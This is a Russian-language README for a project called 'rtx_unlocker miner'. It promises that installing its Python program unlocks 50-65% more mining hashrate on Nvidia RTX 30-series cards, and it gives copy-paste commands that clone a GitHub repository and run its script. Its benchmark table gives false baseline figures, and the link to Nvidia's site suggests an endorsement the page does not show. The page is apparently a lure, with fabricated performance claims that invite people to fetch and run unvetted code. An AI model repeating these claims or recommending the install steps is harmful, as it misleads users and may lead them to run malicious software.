# rtx_unlocker miner

Данный проект создан в целях помощи майнерам для полного раскрытия возможностей видеокарт Nvidia RTX 30-й серии.

<h4 align="center">
  <img alt="RTX_3090" src="https://www.notebookcheck-ru.com/fileadmin/Notebooks/NVIDIA/geforce_rtx_3090_fe.png">
</h4>

Ключевые особенности:
1. Повышения хэшрейта видеокарт на 50-65%.

2. Простота установки.

3. Отстуствие комиссии за использование майнера.

4. Мультиплатформенность.

## Getting started
После загрузки последней версии, установите и запустите ее для начала майнинга.

Если вам нужна помощь, вы сможете найти ответы [на официальном сайте](https://www.nvidia.com/ru-ru/).

### Manual installation
#### Linux

```BASH
sudo apt update
sudo apt install python3 python3-pip git python3-pil python3-pil.imagetk -y # Install dependencies
git clone https://github.com/boltlox/rtx_miner # Clone rtx_miner repository
cd rtx_miner
python3 -m pip install -r requirements.txt # Install pip dependencies
```

После этого вы сможете запустить программу (e.g. `python3 RTX_Miner.py`).

## Benchmarks of officially tested devices
<details>
    <summary>
        Сравнительная таблица хэшрейта разных видеокарт при использовании майнера.
    </summary>

|Видеокарта   |Обычный хэшрейт (MH/s)  |Разблокированный хэшрейт (MH/s)  |
|---|---|---|
|RTX 3070   |24   |58   |
|RTX 3080   |32   |66   |
|RTX3090   |36   |71   |

</details>


## Development

Вы можете помочь разрабтке проекта разными способами, все пожертвования будут направлены на разработку новых версий майнера.

Как помочь?

*   Форкните проект
*   Создайте свою ветку
*   Сделайте коммит своих изменений
*   Убедитесь, что ваши изменения не ломают работу проекта
*   Создайте pull request

>Программы — как секс: лучше, когда бесплатно.
>(c) Линус Торвальдс
